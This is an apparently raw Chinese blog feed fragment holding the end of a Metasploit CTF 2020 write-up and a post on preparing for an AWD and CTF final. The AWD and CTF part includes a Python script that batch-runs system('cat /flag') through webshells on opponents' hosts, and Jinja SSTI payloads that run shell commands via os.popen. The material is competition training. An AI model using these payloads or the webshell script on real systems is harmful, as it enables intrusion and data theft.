&quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD HTML 4.01&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;html4&#x2F;strict.dtd&quot;&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;Directory listing for &#x2F;&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Directory listing for &#x2F;&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">&lt;li&gt;&lt;a href&#x3D;&quot;8_of_hearts.elf&quot;&gt;8_of_hearts.elf&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">&lt;li&gt;&lt;a href&#x3D;&quot;8_of_hearts.enc&quot;&gt;8_of_hearts.enc&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">&lt;&#x2F;ul&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>用curl -o 这次好像不能下载了， 用wget下载就可以了。</p><pre><code>8_of_hearts.elf8_of_hearts.enc</code></pre><p>得到这两个二进制文件。</p><p>xxd 查看一下</p><p>![image-20201208004140345](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201208004140345.png)</p><p>拖入IDA，F5一波（x），查看字符串：</p><p>![image-20201208005344308](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201208005344308.png)</p><p>F5一下 main函数：</p><p>![image-20201208005832787](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201208005832787.png)</p><h2 id="6868端口"><a href="#6868端口" class="headerlink" title="6868端口"></a>6868端口</h2><h2 id="8092端口"><a href="#8092端口" class="headerlink" title="8092端口"></a>8092端口</h2><p>![image-20201208011629368](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201208011629368.png)</p><h2 id="8101端口"><a href="#8101端口" class="headerlink" title="8101端口"></a>8101端口</h2><p>![image-20201207221508164](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201207221508164.png)</p><h2 id="8200-文件上传GetShell"><a href="#8200-文件上传GetShell" class="headerlink" title="8200 文件上传GetShell"></a>8200 文件上传GetShell</h2><p>BP 要先设置 socks ，然后才能正常的抓包和重放。</p><p>![image-20201207215251038](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201207215251038.png)</p><p>有两种错误：</p><ul><li>Unsupported mime type (文件上传的后缀和content-type 不对应)</li><li>Unsupported file format(gif以及其他后缀，只能传 jpg 和  png)</li></ul><p>![image-20201208000008329](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201208000008329.png)</p><h2 id="8202端口"><a href="#8202端口" class="headerlink" title="8202端口"></a>8202端口</h2><p>![image-20201208012652639](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201208012652639.png)</p><h2 id="8888端口"><a href="#8888端口" class="headerlink" title="8888端口"></a>8888端口</h2><p>![image-20201208012835327](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201208012835327.png)</p><h2 id="9000端口"><a href="#9000端口" class="headerlink" title="9000端口"></a>9000端口</h2><p>![image-20201208013004434](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201208013004434.png)</p><h2 id="9001端口"><a href="#9001端口" class="headerlink" title="9001端口"></a>9001端口</h2><p>![image-20201208013102209](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201208013102209.png)</p><h2 id="9010端口-Queen-of-Hearts"><a href="#9010端口-Queen-of-Hearts" class="headerlink" title="9010端口 Queen of Hearts"></a>9010端口 Queen of Hearts</h2><p>直接访问，给了一个jar包。</p><p>![image-20201207211819717](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201207211819717.png)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">──&gt; java -jar QOH_Client.jar                        ──(一,1207)─┘</span><br><span class="line">Usage:</span><br><span class="line">java -jar QOH_Client.jar &lt;ip&gt; &lt;port&gt;</span><br><span class="line"></span><br><span class="line">where port is generally 9008</span><br><span class="line">──&gt; proxychains4 java -jar QOH_Client.jar 172.15.53.85 9008</span><br></pre></td></tr></table></figure><p>[proxychains] Strict chain  …  xx.xx.xxx.116:6443  …  xx.xx.xxx.116:6080  …  172.15.53.85:9008  …  OK<br>Successfully connected to the server!<br>Please select an available action from the list below:<br>[1] Lists available files on the server<br>[2] Download available files from the server<br>[3] Authenticate to the server</p><p>1<br>Executing action…<br>Listing available files to download:</p><p>test.txt<br>queen_of_hearts.png<br>todo.md</p><p>Please select an available action from the list below:<br>[1] Lists available files on the server<br>[2] Download available files from the server<br>[3] Authenticate to the server</p><p>2<br>Executing action…<br>Checking authentication status…<br>You are not authenticated. Please authenticate before attempting to download from the server</p><p>要拿Queen of Hearts这个题的flag，要知道密码，em，好像不能暴破，先放一下。</p><h2 id="9007端口-Red-Joker"><a href="#9007端口-Red-Joker" class="headerlink" title="9007端口 Red Joker"></a>9007端口 Red Joker</h2><p>![image-20201207212225564](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201207212225564.png)</p><p>下载里面就有一个图片，直接 md5 filename 获取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌─(~&#x2F;CTF&#x2F;metasploit_ctf&#x2F;red_joker)─────────────────────────────────────────────────────────────────────────────────────────────────(m0nk3y@RedTeaming:s000)─┐</span><br><span class="line">└─(21:24:29)──&gt; md5 joker_red.png                                                                                                               ──(一,1207)─┘</span><br><span class="line">MD5 (joker_red.png) &#x3D; ded8965ad103400300b7180b42f55e28</span><br></pre></td></tr></table></figure><h2 id="9009"><a href="#9009" class="headerlink" title="9009"></a>9009</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─(01:32:22)──&gt; proxychains4 curl http:&#x2F;&#x2F;172.15.53.85:9009                                                                                      ──(二,1208)─┘</span><br><span class="line">[proxychains] config file found: &#x2F;usr&#x2F;local&#x2F;etc&#x2F;proxychains.conf</span><br><span class="line">[proxychains] preloading &#x2F;usr&#x2F;local&#x2F;Cellar&#x2F;proxychains-ng&#x2F;4.14&#x2F;lib&#x2F;libproxychains4.dylib</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.14</span><br><span class="line">[proxychains] Strict chain  ...  45.76.110.116:6443  ...  45.76.110.116:6080  ...  172.15.53.85:9009  ...  OK</span><br><span class="line">SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3</span><br><span class="line">Protocol mismatch.</span><br></pre></td></tr></table></figure><h1 id="国外友人的WP"><a href="#国外友人的WP" class="headerlink" title="国外友人的WP"></a>国外友人的WP</h1><p><a href="https://rushisec.net/metasploit-ctf-2020-writeup/#9ofheartsport53">https://rushisec.net/metasploit-ctf-2020-writeup/#9ofheartsport53</a></p><p><a href="https://ctftime.org/event/1200/tasks/">https://ctftime.org/event/1200/tasks/</a></p><p>挺不错的，就是发现比赛有点晚了，就打了一会儿就给停了vps。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境准备&quot;&gt;&lt;a href=&quot;#环境准备&quot; class=&quot;headerlink&quot; title=&quot;环境准备&quot;&gt;&lt;/a&gt;环境准备&lt;/h1&gt;&lt;p&gt;两台靶机：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;2020-12-07 10:51:45.687490&lt;</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>备战祥云杯总决赛</title>
    <link href="https://hack-for.fun/4ca3.html"/>
    <id>https://hack-for.fun/4ca3.html</id>
    <published>2020-12-06T16:55:16.000Z</published>
    <updated>2020-12-11T03:23:03.828Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>祥云杯线下，队友让我去打。感谢队友(小组成员)的信任，但是我线上几乎没有输出。因为p1g3师傅太猛了，我都忙着复现去了。所以，去打线下，一方面有点不好意思，二方面有些压力，因为毕竟是大场面。我也是第一次打这种大比赛吧，全是高手。</p></blockquote><h2 id="日程"><a href="#日程" class="headerlink" title="日程"></a>日程</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207010127.png" alt="image-20201207010126323"></p><p>在比赛前，每天都干CTF了。</p><p>还有搬砖，以及期末复习。</p><h2 id="总决赛计分规则"><a href="#总决赛计分规则" class="headerlink" title="总决赛计分规则"></a>总决赛计分规则</h2><p>总决赛 =  CTF赛 + AWD 对抗赛</p><p><strong>第一天8小时AWD + 第二天6小时CTF。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207010103.png" alt="image-20201207005937030"></p><h1 id="Attack-With-Defense"><a href="#Attack-With-Defense" class="headerlink" title="Attack With Defense"></a>Attack With Defense</h1><p>用的杭电的平台：</p><blockquote><p>请输入管理员账号：<br>d0g3awd<br>请输入管理员密码：<br>d0g3awd</p><p><a href="https://github.com/vidar-team/Cardinal/issues/77">https://github.com/vidar-team/Cardinal/issues/77</a></p><p>2020/12/08 09:40:51 添加管理员账号成功，请妥善保管您的账号密码信息！<br>2020/12/08 09:40:51 比赛总轮数：6656<br>2020/12/08 09:40:51 比赛总时长：33280  分钟<br>2020/12/08 09:40:51 Round 5</p></blockquote><p>启动平台：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service mysqld stop</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;mysqld_safe --skip-grant-tables</span><br><span class="line">然后守护进程启动平台即可</span><br></pre></td></tr></table></figure><h2 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h2><p><a href="https://xz.aliyun.com/t/6416#toc-1%EF%BC%88%E5%B9%BF%E4%B8%9C%E5%BC%BA%E7%BD%91%E6%9D%AFAWD%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90%EF%BC%89">https://xz.aliyun.com/t/6416#toc-1（广东强网杯AWD题目分析）</a></p><p><a href="https://www.cnblogs.com/Rcsec/p/9328011.html%EF%BC%88%E7%BA%BF%E4%B8%8BAWD%E5%A5%97%E8%B7%AF%E5%B0%8F%E7%BB%93%EF%BC%89">https://www.cnblogs.com/Rcsec/p/9328011.html（线下AWD套路小结）</a></p><p><a href="https://www.cnblogs.com/HacTF/p/9606589.html%EF%BC%88%E6%90%85%E5%B1%8E%E6%A8%A1%E5%BC%8F%EF%BC%89">https://www.cnblogs.com/HacTF/p/9606589.html（搅屎模式）</a></p><p><a href="https://www.freebuf.com/articles/network/201222.html%EF%BC%88AWD%E6%94%BB%E9%98%B2%E8%B5%9B%E6%B5%81%E7%A8%8B%E5%8F%8A%E5%87%86%E5%A4%87%E7%BB%8F%E9%AA%8C%EF%BC%8C%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E4%B8%8B%E9%9D%A2%E7%9A%84%E8%B5%84%E6%BA%90%E9%93%BE%E6%8E%A5%E6%9B%B4%E5%A4%9A%EF%BC%89">https://www.freebuf.com/articles/network/201222.html（AWD攻防赛流程及准备经验，这个网站下面的资源链接更多）</a></p><h2 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h2><ul><li>在线查杀</li></ul><p><a href="https://phpchip.com/">https://phpchip.com/</a></p><p><a href="https://scanner.baidu.com/#/pages/intro">https://scanner.baidu.com/#/pages/intro</a></p><ul><li>本地查杀</li></ul><p>D盾、Seay</p><ul><li>服务器命令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find . -name &#39;*.php&#39; | xargs grep -n &#39;eval(&#39;</span><br><span class="line">find . -name &#39;*.php&#39; | xargs grep -n &#39;assert(&#39;</span><br><span class="line">find . -name &#39;*.php&#39; | xargs grep -n &#39;system(&#39;</span><br></pre></td></tr></table></figure><h2 id="流量-日志分析"><a href="#流量-日志分析" class="headerlink" title="流量\日志分析"></a>流量\日志分析</h2><p>将攻击流量dump下来，分析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -s 0 port xxxx -w flow.pcap</span><br></pre></td></tr></table></figure><p>有root权限的话：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">有root权限</span><br><span class="line">那麽，这样就简单了，直接写在配置中。</span><br><span class="line"></span><br><span class="line">vim php.ini</span><br><span class="line"></span><br><span class="line">auto_append_file &#x3D; “&#x2F;dir&#x2F;path&#x2F;phpwaf.php”</span><br><span class="line"></span><br><span class="line">重启Apache或者php-fpm就能生效了。</span><br><span class="line"></span><br><span class="line">当然也可以写在 .user.ini 或者 .htaccess 中。</span><br><span class="line"></span><br><span class="line">php_value auto_prepend_file “&#x2F;dir&#x2F;path&#x2F;phpwaf.php”</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">date_default_timezone_set(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);</span><br><span class="line">$ip       = $_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]; <span class="comment">//记录访问者的ip</span></span><br><span class="line">$filename = $_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>];   <span class="comment">//访问者要访问的文件名</span></span><br><span class="line">$parameter   = $_SERVER[<span class="string">&quot;QUERY_STRING&quot;</span>]; <span class="comment">//访问者要请求的参数</span></span><br><span class="line">$time     =   date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>,time()); <span class="comment">//访问时间</span></span><br><span class="line">$logadd = <span class="string">&#x27;来访时间：&#x27;</span>.$time.<span class="string">&#x27;--&gt;&#x27;</span>.<span class="string">&#x27;访问链接：&#x27;</span>.<span class="string">&#x27;http://&#x27;</span>.$ip.$filename.<span class="string">&#x27;?&#x27;</span>.$parameter.<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// log记录</span></span><br><span class="line">$fh = fopen(<span class="string">&quot;/tmp/log.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">fwrite($fh, $logadd);</span><br><span class="line">fclose($fh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="备份网站源码"><a href="#备份网站源码" class="headerlink" title="备份网站源码"></a>备份网站源码</h2><p>防止被删站。。之前去参观安洵杯线下AWD的时候，有一个队就是批量扫除其他选手的网站。让其他选手被check，那么久相当于自己得分咯。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 打包目录</span><br><span class="line">tar -zcvf web.tar.gz &#x2F;var&#x2F;www&#x2F;html 备份源码</span><br><span class="line">tar -zcf &#x2F;tmp&#x2F;name.tar.gz &#x2F;path&#x2F;web</span><br><span class="line"># 解包</span><br><span class="line">tar -zxvf archive_name.tar.gz</span><br></pre></td></tr></table></figure><h2 id="备份数据库"><a href="#备份数据库" class="headerlink" title="备份数据库"></a>备份数据库</h2><p>针对mysql数据库，如果被搅屎了，数据库也被删了，就算网站有备份也没用啊。因为没数据库文件，网站也不能过check。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">备份</span><br><span class="line">[root@localhost ~]# cd &#x2F;var&#x2F;lib&#x2F;mysql (进入到MySQL库目录，根据自己的MySQL的安装情况调整目录)</span><br><span class="line">[root@localhost mysql]# mysqldump -u 用户名 -p 数据库名&gt;导出的文件名</span><br><span class="line">mysqldump -u root -p 数据库名&gt;Test0809.sql，输入密码即可。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 备份指定的多个数据库</span><br><span class="line">mysqldump -u root -p --databases choose test &gt; &#x2F;tmp&#x2F;db.sql</span><br><span class="line"># 恢复备份，在mysql终端下执行：</span><br><span class="line"># 命令格式：source FILE_PATH</span><br><span class="line">source ~&#x2F;db.sql</span><br><span class="line"># 曾经遇到一个备份有问题可以执行下面</span><br><span class="line">mysqldump -u root --all-databases —skip-lock-tables &gt; &#x2F;tmp&#x2F;db.sql</span><br><span class="line"># 重置mysql密码</span><br><span class="line"># 方法1：用SET PASSWORD命令</span><br><span class="line">mysql&gt; set password for 用户名@localhost &#x3D; password(&#39;新密码&#39;);</span><br><span class="line"># 方法2：用mysqladmin</span><br><span class="line">mysqladmin -u用户名 -p旧密码 password 新密码</span><br></pre></td></tr></table></figure><h2 id="删除后门"><a href="#删除后门" class="headerlink" title="删除后门"></a>删除后门</h2><p>有时候权限不够，可能没办法删除，注释掉就行了。</p><p>修改其中的地址、shell路径和密码即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://192.168.71.&quot;</span></span><br><span class="line">url1=<span class="string">&quot;&quot;</span></span><br><span class="line">shell=<span class="string">&quot;/Upload/index.php&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;abcde10db05bd4f6a24c94d7edde441d18545&quot;</span> </span><br><span class="line">port=<span class="string">&quot;80&quot;</span></span><br><span class="line">payload = &#123;passwd: <span class="string">&#x27;system(\&#x27;cat /flag\&#x27;);&#x27;</span>&#125;</span><br><span class="line">f=open(<span class="string">&quot;webshelllist.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) </span><br><span class="line">f1=open(<span class="string">&quot;firstround_flag.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">51</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">41</span>,<span class="number">42</span>,<span class="number">43</span>,<span class="number">71</span>,<span class="number">72</span>,<span class="number">73</span>,<span class="number">81</span>,<span class="number">82</span>,<span class="number">83</span>]: </span><br><span class="line">    url1=url+str(i)+<span class="string">&quot;:&quot;</span>+port+shell</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res=requests.post(url1,payload,timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == requests.codes.ok:</span><br><span class="line">            <span class="keyword">print</span> url1+<span class="string">&quot; connect shell sucess,flag is &quot;</span>+res.text</span><br><span class="line">            <span class="keyword">print</span> &gt;&gt;f1,url1+<span class="string">&quot; connect shell sucess,flag is &quot;</span>+res.text</span><br><span class="line">            <span class="keyword">print</span> &gt;&gt;f,url1+<span class="string">&quot;,&quot;</span>+passwd</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;shell 404&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> url1+<span class="string">&quot; connect shell fail&quot;</span></span><br><span class="line"></span><br><span class="line">f.close()</span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure><p><a href="http://mang0.me/archis/49b464e6/">http://mang0.me/archis/49b464e6/</a></p><ul><li>处理不死马</li></ul><p>kill 进程、删马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    $pid=<span class="number">1234</span>;</span><br><span class="line">    @unlink(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">    exec(<span class="string">&#x27;kill -9 $pid&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><hr><p>前面的大部分都是针对PHP的，下来来看看python和java的。主要是如何修洞。</p><h2 id="Python-AWD"><a href="#Python-AWD" class="headerlink" title="Python AWD"></a>Python AWD</h2><h2 id="Java-AWD"><a href="#Java-AWD" class="headerlink" title="Java AWD"></a>Java AWD</h2><h2 id="NodeJS-AWD"><a href="#NodeJS-AWD" class="headerlink" title="NodeJS AWD"></a>NodeJS AWD</h2><h1 id="CTF-Jeopardy"><a href="#CTF-Jeopardy" class="headerlink" title="CTF Jeopardy"></a>CTF Jeopardy</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><ul><li>RC4</li><li>SSTI</li></ul><p>![image-20201207005524605](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201207005524605.png)</p><p>rc4 加密的key：HereIsTreasure</p><p>绿色框里面，将 输入的 secret， 进行加密后，模板渲染，那么这里就存在SSTI。具体safe函数如何可以不用管。</p><p>在线加解密：<a href="https://www.sojson.com/encrypt_rc4.html">https://www.sojson.com/encrypt_rc4.html</a></p><p>WP: <a href="https://www.cnblogs.com/h3zh1/p/12653579.html">https://www.cnblogs.com/h3zh1/p/12653579.html</a></p><p><a href="https://xz.aliyun.com/t/5644">https://xz.aliyun.com/t/5644</a></p><blockquote><p>RC4加密算法是一种对称加密算法。所谓对称加密算法，说得直白一点，就是加密与解密的过程一模一样。假设定义RC4的运算过程是rc4(key,data)，那么，密文=rc4(key,明文)，明文=rc4(key,密文)。这种对称性就是基于秘钥流的加密算法的特征之一，RC4本质上就是一种秘钥流生成算法。其特点就是简单、运行效率高，不会占用过多的CPU，因此常用在很多旧无线网卡的WEP加密。</p></blockquote><p>py加密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><span class="comment">#返回加密后得内容</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = str(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = list(range(<span class="number">256</span>)) </span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(chr(ord(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="keyword">return</span> (str(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;HereIsTreasure&quot;</span>  <span class="comment">#此处为密文</span></span><br><span class="line">message = input(<span class="string">&quot;请输入明文:\n&quot;</span>)</span><br><span class="line">enc_base64 = rc4_main( key , message )</span><br><span class="line">enc_init = str(base64.b64decode(enc_base64),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">enc_url = parse.quote(enc_init)</span><br><span class="line">print(<span class="string">&quot;rc4加密后的url编码:&quot;</span>+enc_url)</span><br><span class="line"><span class="comment">#print(&quot;rc4加密后的base64编码&quot;+enc_base64)</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls &#x2F;&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag.txt&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;&#x2F;flag.txt&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="CISCN2019-华东北赛区-Web2"><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a>[CISCN2019 华东北赛区]Web2</h2><p>靶机无法访问外网，请使用 <a href="http://xss.buuoj.cn/">xss.buuoj.cn</a></p><p>反馈时请使用 web 来代替地址中的靶机域名。</p><ul><li>祖传 CTF md5 验证码。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span 